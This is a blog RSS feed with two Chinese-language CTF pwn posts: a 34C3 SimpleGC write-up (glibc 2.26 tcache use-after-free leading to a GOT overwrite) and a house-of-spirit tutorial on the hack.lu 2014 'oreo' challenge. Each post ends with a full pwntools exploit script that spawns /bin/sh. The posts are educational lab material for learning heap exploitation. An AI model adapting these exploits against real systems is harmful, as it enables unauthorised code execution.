<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hc1m1</title>
    <link>http://0x48.pw/</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
    <pubDate>Wed, 17 Jan 2018 19:54:48 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>34c3 ctf simpleGC writeup</title>
      <link>http://0x48.pw/2018/01/17/0x40/</link>
      <guid>http://0x48.pw/2018/01/17/0x40/</guid>
      <pubDate>Wed, 17 Jan 2018 09:48:48 GMT</pubDate>
      <description>
      
        &lt;p&gt;一道glibc 2.26堆利用的题目&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>一道glibc 2.26堆利用的题目</p>
<a id="more"></a>
<p>题目链接：<a href="https://github.com/Hcamael/CTF_repo/tree/master/34c3ctf%202017/SimpleGC" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/34c3ctf%202017/SimpleGC</a></p>
<h1 id="部署调试环境"><a href="#部署调试环境" class="headerlink" title="部署调试环境"></a>部署调试环境</h1><p>本题的libc给的是2.26版本的，测试系统用的是ubuntu16.04，libc版本为2.24，得知2.24-2.26在堆管理这块更新了一些机制，所以不能用本地的libc进行测试</p>
<p>这个可以使用：</p>
<ol>
<li>LD_PRELOAD=./libc-2.26.so   来指定libc库</li>
<li>自己编译一份2.26的libc</li>
</ol>
<p>因为目前没发现有使用glibc 2.26的linux系统，所以只有上面两种方法</p>
<h1 id="分析漏洞"><a href="#分析漏洞" class="headerlink" title="分析漏洞"></a>分析漏洞</h1><h2 id="sub-40131B函数"><a href="#sub-40131B函数" class="headerlink" title="sub_40131B函数"></a>sub_40131B函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">edit_group()</div><div class="line">&#123;</div><div class="line">  int v1;</div><div class="line">  group_heap *v2;</div><div class="line">  char nptr;</div><div class="line">  char v4;</div><div class="line">  unsigned __int64 v5;</div><div class="line"></div><div class="line">  printf(&quot;Enter index: &quot;);</div><div class="line">  read_len((__int64)&amp;nptr, 4uLL);</div><div class="line">  v1 = atoi(&amp;nptr);</div><div class="line">  if ( database[v1] )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;Would you like to propagate the change, this will update the group of all the users sharing this group(y/n): &quot;);</div><div class="line">    read_len((__int64)&amp;nptr, 2uLL);</div><div class="line">    printf(&quot;Enter new group name: &quot;);</div><div class="line">    if ( nptr == &apos;y&apos; )</div><div class="line">    &#123;</div><div class="line">      read_len(database[v1]-&gt;group, 0x18uLL);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">      read_len((__int64)&amp;v4, 0x18uLL);</div><div class="line">      v2 = add_group_number(&amp;v4);</div><div class="line">      if ( v2 )</div><div class="line">        database[v1]-&gt;group = v2-&gt;group;</div><div class="line">      else</div><div class="line">        database[v1]-&gt;group = _store_group((__int64)&amp;v4)-&gt;group;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在这个函数中有两个漏洞，一个输入的v1未经检查，可以造成数组越界的问题</p>
<p>另外一个就是当输入<code>n</code>的时候，会重新增加一个group，然后把当前user的group指向新的group，而当前group的计数位不会减1，这就会导致一个情况，可以让一个group的计数位增加到0x100</p>
<p>再看另一个线程执行的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">start_routine()</div><div class="line">&#123;</div><div class="line">  unsigned int i;</div><div class="line"></div><div class="line">  sleep(1u);</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    for ( i = 0; i &lt;= 0x5F; ++i )</div><div class="line">    &#123;</div><div class="line">      if ( group_database[i] )</div><div class="line">      &#123;</div><div class="line">        if ( !LOBYTE(group_database[i]-&gt;number) )</div><div class="line">        &#123;</div><div class="line">          free((void *)group_database[i]-&gt;group);</div><div class="line">          free(group_database[i]);</div><div class="line">          group_database[i] = 0LL;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    sleep(0);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数是本题的关键函数，属于自己使用代码实现的垃圾回收机制，当group的计数位为0的时候，则表示该group没有user使用，所以进行两个free操作，因为取的是计数位的一个字节，所以如果计数位为0x100，则判断为0，进行free操作，这样将会造成uaf漏洞，释放后的堆还能被使用。</p>
<p>但是这个漏洞的利用太麻烦了，下面，还有一个更容易利用的漏洞</p>
<h2 id="sub-4011c4函数"><a href="#sub-4011c4函数" class="headerlink" title="sub_4011c4函数"></a>sub_4011c4函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">delete_user()</div><div class="line">&#123;</div><div class="line">  unsigned int v1;</div><div class="line">  char nptr;</div><div class="line">  unsigned __int64 v3;</div><div class="line"></div><div class="line">  printf(&quot;Enter index: &quot;);</div><div class="line">  read_len((__int64)&amp;nptr, 4uLL);</div><div class="line">  v1 = atoi(&amp;nptr);</div><div class="line">  if ( v1 &lt;= 0x5F )</div><div class="line">  &#123;</div><div class="line">    if ( database[v1] )</div><div class="line">    &#123;</div><div class="line">      sub_401139((const char *)database[v1]-&gt;group);</div><div class="line">      free(database[v1]);</div><div class="line">      database[v1] = 0LL;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    puts(&quot;invalid index&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在该函数中调用了<code>sub_401139</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">sub_401139(const char *a1)</div><div class="line">&#123;</div><div class="line">  unsigned __int16 i;</div><div class="line"></div><div class="line">  for ( i = 0; i &lt;= 0x5Fu; ++i )</div><div class="line">  &#123;</div><div class="line">    if ( group_database[i] &amp;&amp; !strcmp(a1, (const char *)group_database[i]-&gt;group) )</div><div class="line">    &#123;</div><div class="line">      if ( LOBYTE(group_database[i]-&gt;number) )</div><div class="line">        --LOBYTE(group_database[i]-&gt;number);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数的目的是，传入被删除的user的group_name，然后到group数据库中去查找是该名字的group，把计数位减1</p>
<p>正常情况下看这逻辑是没问题的，因为无法创建两个同名的group</p>
<p>但是在<code>edit_group</code>函数中，如果输入<code>y</code>的情况下，我们能对group_name进行修改，这样就能导致A和B两个group重名，group_name都为<code>test1</code>，这样在删除的情况下，两个group的计数位都会进行自减1，最后导致uaf漏洞</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>使用上述第二个漏洞进行利用</p>
<p>首先增加6个不同group</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Group_name</th>
<th>Age</th>
</tr>
</thead>
<tbody>
<tr>
<td>a</td>
<td>b</td>
<td>0</td>
</tr>
<tr>
<td>a</td>
<td>bb</td>
<td>0</td>
</tr>
<tr>
<td>a</td>
<td>bbb</td>
<td>0</td>
</tr>
<tr>
<td>a</td>
<td>bbbb</td>
<td>0</td>
</tr>
<tr>
<td>a</td>
<td>bbbbb</td>
<td>0</td>
</tr>
<tr>
<td>a</td>
<td>bbbbbb</td>
<td>0</td>
</tr>
</tbody>
</table>
<p>然后修改第5个group的<code>group_name</code>为<code>bbbbbb</code>和第六个同名</p>
<p>然后我在delete前5个user</p>
<p>这样在主线程中，一个free了5个size=0x21的fastbin，将放入tcache中</p>
<p>然后在子线程中，一个group free了两个size=0x21的fastbin，将放入tcache</p>
<p>不同线程中，tcache的储存位置不同，tcache的一个size一共能储存最多8个该size的chunk，当tcache满了以后，将会放入fastbin中</p>
<p>所以在这一波骚操作以后，主线程的tcache中，一个有5个size=0x21的chunk</p>
<p>而在子线程中，tcache已经被存满了8个size=0x21的chunk</p>
<p>在第5个user被delete的时候，因为第五个user的group_name已经被修改为和第六个user的group_name重名，所以两个group的计数位皆会自减1，然后在子线程中被free，因为这时候该size的tcache中已被填满，所以被free的chunk将会被放入fastbin中，0x20的fastbin将会有4个</p>
<p>这个时候第6个user还存在，但是其group却被free，这造成了uaf漏洞，如果我们输出该user的信息，在group字段后面将会输出fastbin单链表中的fd地址信息，可以计算出堆地址(但是对本题没啥用)</p>
<p>因为第6个user并没有被delete，所以我们仍然能使用<code>edit_group</code>对其的<code>group_name</code>进行修改, 但是因为存储group_name的chunk已经被free，所以我们可以修改该fastbin的fd</p>
<p>修改到地址: 0x6020E0</p>
<p>该地址是user的指针数组，我们把该地址-0x10改写到fastbin的fd中去</p>
<p>然后通过<code>edit_group</code>函数，输入<code>n</code>，进行新建group，首先新建两个group，从tcache中拿出去了4个chunk，因为在主线程中，tcache只有5个chunk，所以再次新建一个group，则会从tcache中拿出最后一个chunk，然后把fastbin中的chunk放入tcache中去，再获取一个chunk</p>
<p>这个时候tcache中size=0x21的chunk指针指向的是(0x6020E0-0x10)</p>
<p>所以我们再次新建一个group，用于储存group_name的chunk的返回地址就是<code>0x6020E0</code></p>
<p>这样我们就能在0x6020E0地址开始任意写入0x18byte的数据</p>
<table>
<thead>
<tr>
<th>/bin/sh\0</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x6020E0</td>
</tr>
<tr>
<td>free_got</td>
</tr>
</tbody>
</table>
<p>把上述数据写入<code>0x6020E0</code>地址后，user[1]指向的就是地址<code>0x6020E0</code>,看起结构体组成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">database_heap   struc ;</div><div class="line">age             dq ?</div><div class="line">name            dq ?</div><div class="line">group           dq ?</div><div class="line">database_heap   ends</div></pre></td></tr></table></figure>
<p>首先是age，然后是指向name的地址，然后是指向group的地址，当我们输出user1时，在group字段将会输出free_got地址的值，这样就能计算出libc的基地址，从而算出system的地址</p>
<p>我们再把free_got的地址改成system的地址</p>
<p>当我们delete user1时，调用的是free(0x6020E0)，而实际调用的是<code>system(&quot;/bin/sh&quot;)</code>，从而达到getshell的目的</p>
<p>附上完整payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">def addUser(name, group, age):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;0&quot;)</div><div class="line">    r.sendlineafter(&quot;name:&quot;, name)</div><div class="line">    r.sendlineafter(&quot;group:&quot;, group)</div><div class="line">    r.sendlineafter(&quot;age:&quot;, str(age))</div><div class="line"></div><div class="line">def displayGroup(groupName):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;1&quot;)</div><div class="line">    r.sendlineafter(&quot;name:&quot;, groupName)</div><div class="line"></div><div class="line">def displayUser(idx):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;2&quot;)</div><div class="line">    r.sendlineafter(&quot;index:&quot;, str(idx))</div><div class="line">    r.recvuntil(&quot;Group: &quot;)</div><div class="line">    return r.readline().strip()</div><div class="line"></div><div class="line">def editGroup(idx, propogate, groupName):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;3&quot;)</div><div class="line">    r.sendlineafter(&quot;index:&quot;, str(idx))</div><div class="line">    r.sendlineafter(&quot;(y/n):&quot;, propogate)</div><div class="line">    r.sendlineafter(&quot;name:&quot;, groupName)</div><div class="line"></div><div class="line">def deleteUser(idx):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;4&quot;)</div><div class="line">    r.sendlineafter(&quot;index:&quot;, str(idx))</div><div class="line"></div><div class="line"></div><div class="line">userArr = 0x6020e0</div><div class="line">free_got = 0x602018</div><div class="line"></div><div class="line">r = process([&apos;/opt/libc-2.26/lib/ld-linux-x86-64.so.2&apos;, &apos;--library-path&apos;, &apos;/opt/libc-2.26/lib/&apos;, &apos;./sgc&apos;])</div><div class="line">e = ELF(&quot;/opt/libc-2.26/lib/libc-2.26.so&quot;)</div><div class="line"></div><div class="line">for i in range(9):</div><div class="line">	addUser(&quot;A&quot;, &quot;B&quot;*i, 0)</div><div class="line"></div><div class="line">editGroup(4,&quot;y&quot;,&quot;B&quot;*5)</div><div class="line"># raw_input()</div><div class="line">for i in range(5):</div><div class="line">	deleteUser(i)</div><div class="line"></div><div class="line">sleep(1)</div><div class="line"></div><div class="line">heap_base = u64(displayUser(5).ljust(8, &apos;\0&apos;)) - 0x590</div><div class="line">log.success(&quot;heap_base at: &quot;+hex(heap_base))</div><div class="line"></div><div class="line">editGroup(5,&quot;y&quot;, p64(userArr-0x10))</div><div class="line"># raw_input()</div><div class="line">editGroup(5, &quot;n&quot;, &quot;1-2&quot;)</div><div class="line">editGroup(5, &quot;n&quot;, &quot;3-4&quot;)</div><div class="line">editGroup(5, &quot;n&quot;, &quot;5-fastbin1&quot;)</div><div class="line"></div><div class="line">payload = &quot;/bin/sh\0&quot;</div><div class="line">payload += p64(userArr)</div><div class="line">payload += p64(free_got)</div><div class="line">editGroup(5, &quot;n&quot;, payload)</div><div class="line"># raw_input()</div><div class="line"></div><div class="line">libc_free = u64(displayUser(1).ljust(8, &apos;\0&apos;))</div><div class="line">libc_base = libc_free - e.symbols[&quot;free&quot;]</div><div class="line">log.success(&quot;libc_base at: &quot;+hex(libc_base))</div><div class="line"></div><div class="line">system_add = libc_base + e.symbols[&quot;system&quot;]</div><div class="line">editGroup(1, &quot;y&quot;, p64(system_add))</div><div class="line">raw_input()</div><div class="line">deleteUser(1)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>该题中tcache的相关细节我没有细说，因为打算写一篇是专门研究tcache机制的博文</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://blog.rh0gue.com/2018-01-05-34c3ctf-simplegc/" target="_blank" rel="external">http://blog.rh0gue.com/2018-01-05-34c3ctf-simplegc/</a></li>
<li><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="external">http://tukan.farm/2017/07/08/tcache/</a></li>
</ol>
]]></content:encoded>
      
      <comments>http://0x48.pw/2018/01/17/0x40/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Pwn学习之house of系列(一)</title>
      <link>http://0x48.pw/2018/01/16/0x41/</link>
      <guid>http://0x48.pw/2018/01/16/0x41/</guid>
      <pubDate>Tue, 16 Jan 2018 02:25:07 GMT</pubDate>
      <description>
      
        &lt;p&gt;准备些一份house of系列的学习博文，在how2heap上包括下面这些：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;house of spirit&lt;/li&gt;
&lt;li&gt;house_of_force&lt;/li&gt;
&lt;li&gt;house_of_einherjar&lt;/li&gt;
&lt;li&gt;house_of_orange&lt;/li&gt;
&lt;li&gt;house_of_lore&lt;/li&gt;
&lt;/ul&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>准备些一份house of系列的学习博文，在how2heap上包括下面这些：</p>
<ul>
<li>house of spirit</li>
<li>house_of_force</li>
<li>house_of_einherjar</li>
<li>house_of_orange</li>
<li>house_of_lore</li>
</ul>
<a id="more"></a>
<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><p>house of spirit是fastbin的一种利用方法，利用demo可参考: <a href="https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c</a></p>
<p>我通过具体的CTF Pwn题目来学习该利用方法，题目见: <a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo" target="_blank" rel="external">https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo</a></p>
<p>这题是hack.lu 2014 ctf的一道400分的32位下的Pwn题，这题原本是没有给libc的，但是我搜了下网上这题的writeup，不需要libc有两种方法，一种是假设服务器上用的是最新版的libc，然后从各个发行版的系统找libc，一个一个试，另一种是使用ret2dl-resolve，这个利用方法我准备单独写一篇博文来说，而本文主要是学习house of spirit，所以就用本地的libc，假设已知libc。</p>
<p>漏洞点很简单，首先要能看出一个结构体：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">struct rifle &#123;</div><div class="line">    char descript[0x19]</div><div class="line">    char name[0x1b]</div><div class="line">    char *pre_add</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后在<code>sub_8048644</code>函数中，大致逻辑如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">add()</div><div class="line">&#123;</div><div class="line">  rifles *v1;</div><div class="line">  unsigned int v2;</div><div class="line"></div><div class="line">  v1 = rifle;</div><div class="line">  rifle = (rifles *)malloc(0x38u);</div><div class="line">  if ( rifle )</div><div class="line">  &#123;</div><div class="line">    rifle-&gt;pre_add = (int)v1;</div><div class="line">    printf(&quot;Rifle name: &quot;);</div><div class="line">    fgets(rifle-&gt;name, 56, stdin);</div><div class="line">    str_deal(rifle-&gt;name);</div><div class="line">    printf(&quot;Rifle description: &quot;);</div><div class="line">    fgets(rifle-&gt;descript, 56, stdin);</div><div class="line">    str_deal(rifle-&gt;descript);</div><div class="line">    ++rifle_num;</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    puts(&quot;Something terrible happened!&quot;);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>结构体中<code>name</code>的长度只有0x1b，但是却能输入56长度的字符串，所以可以把后面的<code>pre_add</code>覆盖，或者把下一个堆进行覆盖</p>
<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>因为libc已知，程序没开PIE，所以只需要泄露libc地址，然后算出libc基地址</p>
<p>内存泄露利用的是<code>sub_8048729</code>函数，该函数的大致逻辑如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">show_rifles()</div><div class="line">&#123;</div><div class="line">  rifles *i;</div><div class="line">  unsigned int v2;</div><div class="line"></div><div class="line">  printf(&quot;Rifle to be ordered:\n%s\n&quot;, &quot;===================================&quot;);</div><div class="line">  for ( i = rifle; i; i = (rifles *)i-&gt;pre_add )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;Name: %s\n&quot;, i-&gt;name);</div><div class="line">    printf(&quot;Description: %s\n&quot;, i);</div><div class="line">    puts(&quot;===================================&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>rifle-&gt;pre_add</code>是可控的，把<code>rifle-&gt;pre_add = 0x804A258-25</code>设置为sscanf的got表地址减去25，这样Name输出的就是<code>sscanf_got</code>的值，并且<code>sscanf_got-&gt;pre_add</code>的值为0，能让该程序继续运行而不报错</p>
<p>得到<code>sscanf_got</code>的值后，可以通过libc的偏移算出libc的基地址</p>
<h2 id="使用house-of-spirit进行任意地址写"><a href="#使用house-of-spirit进行任意地址写" class="headerlink" title="使用house_of_spirit进行任意地址写"></a>使用house_of_spirit进行任意地址写</h2><p>house of spirit简单的来说就是free一个假的fastbin堆块，然后再下次malloc的时候就会返回该假堆块</p>
<p>所以第一步是要构造假的堆块，在该程序中，只有一个<code>malloc(0x38)</code>，所以要构造一个<code>size=0x41</code>的堆块，在<code>.bss_804A2A0</code>地址的<code>order_num</code>，和<code>.bss_804A2A4</code>的<code>rifle_num</code>，一个是在free的时候自增1，一个是在rifle add的时候自增1，所以只要add 0x41次rifle，就能把rifle_num设置为0x41</p>
<p>chunk的size位伪造好了，现在是bypass libc对free fastbin的check，主要是会对下一个chunk的size进行check，所以不仅要伪造当前check的size，还要伪造下一个chunk的size</p>
<p>下一个chunk的地址是<code>0x804A2A4+0x40=0x804a2e4</code>，该地址是储存<code>notice</code>的地址，属于可控区域，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">information = (char *)&amp;unk_804A2C0;</div><div class="line"></div><div class="line">leave()</div><div class="line">&#123;</div><div class="line">  unsigned int v0;</div><div class="line"></div><div class="line">  printf(&quot;Enter any notice you&apos;d like to submit with your order: &quot;);</div><div class="line">  fgets(information, 128, stdin);</div><div class="line">  str_deal(information);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>假堆块构造完成了，free了之后<code>0x804A2A0</code>将会加入到fastbin中，在下一次add rifle的时候malloc会返回该地址，所以<code>0x804A2A4</code>往下的变量都可控，这个时候我们能修改<code>information</code>的值，然后在<code>leave</code>函数会向<code>information</code>指向的地址写入值</p>
<p>这样就达到了任意地址写的目的</p>
<h2 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h2><p>能做到任意地址写，下面就很简单了，方法有很多，我使用的是重写<code>sscanf_got</code>地址的值为计算出的<code>system</code>地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">int read_action()</div><div class="line">&#123;</div><div class="line">  int v1; </div><div class="line">  char s;</div><div class="line">  unsigned int v3;</div><div class="line"></div><div class="line">  do</div><div class="line">  &#123;</div><div class="line">    printf(&quot;Action: &quot;);</div><div class="line">    fgets(&amp;s, 32, stdin);</div><div class="line">  &#125;</div><div class="line">  while ( !__isoc99_sscanf(&amp;s, &quot;%u&quot;, &amp;v1) );</div><div class="line">  return v1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当输入了<code>/bin/sh</code>之后，会赋值给变量<code>s</code>，然后传给<code>sscanf</code>，这时候<code>sscanf_got</code>的值已经被改成了system的值，所以实际执行的是<code>system(&quot;/bin/sh&quot;)</code></p>
<p>最终达成getshell的目的，payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding=utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">def add(name, descrip):</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.readuntil(&quot;name:&quot;)</div><div class="line">    p.sendline(name)</div><div class="line">    p.readuntil(&quot;description:&quot;)</div><div class="line">    p.sendline(descrip)</div><div class="line"></div><div class="line">def show_rifles():</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;2&quot;)</div><div class="line">    p.readuntil(&quot;Name: &quot;)</div><div class="line">    p.readuntil(&quot;Name: &quot;)</div><div class="line">    return u32(p.read(4))</div><div class="line"></div><div class="line">def free():</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line"></div><div class="line">def leave(message):</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;4&quot;)</div><div class="line">    p.readuntil(&quot;order: &quot;)</div><div class="line">    p.sendline(message)</div><div class="line"></div><div class="line"></div><div class="line">sscanf_got = 0x804A258</div><div class="line">fake_heap = 0x804A2A0</div><div class="line">system_offset = 0x3ada0</div><div class="line"></div><div class="line">p = process(&quot;oreo_35f118d90a7790bbd1eb6d4549993ef0&quot;, stdin=PTY)</div><div class="line"></div><div class="line">name_payload1 = &quot;aaa&quot; + &quot;bbbb&quot;*6 + p32(sscanf_got-25)</div><div class="line">add(name_payload1, &quot;hhh&quot;)</div><div class="line">sscanf = show_rifles()</div><div class="line">libc_base = sscanf - 0x5c4c0</div><div class="line">for x in xrange(0x40-1):</div><div class="line">    add(&quot;mm&quot;, &quot;gg&quot;)</div><div class="line"></div><div class="line">name_payload2 = &quot;aaa&quot; + &quot;bbbb&quot;*6 + p32(fake_heap+8)</div><div class="line">add(name_payload2, &quot;uuu&quot;)</div><div class="line">message_payload = &quot;\x00\x00\x00\x00&quot;*9 + p32(0x41)</div><div class="line">leave(message_payload)</div><div class="line"># raw_input()</div><div class="line"></div><div class="line">free()</div><div class="line"># raw_input()</div><div class="line">add(&quot;name&quot;, p32(sscanf_got))</div><div class="line">leave(p32(libc_base+system_offset))</div><div class="line">p.sendline(&quot;/bin/sh\0&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
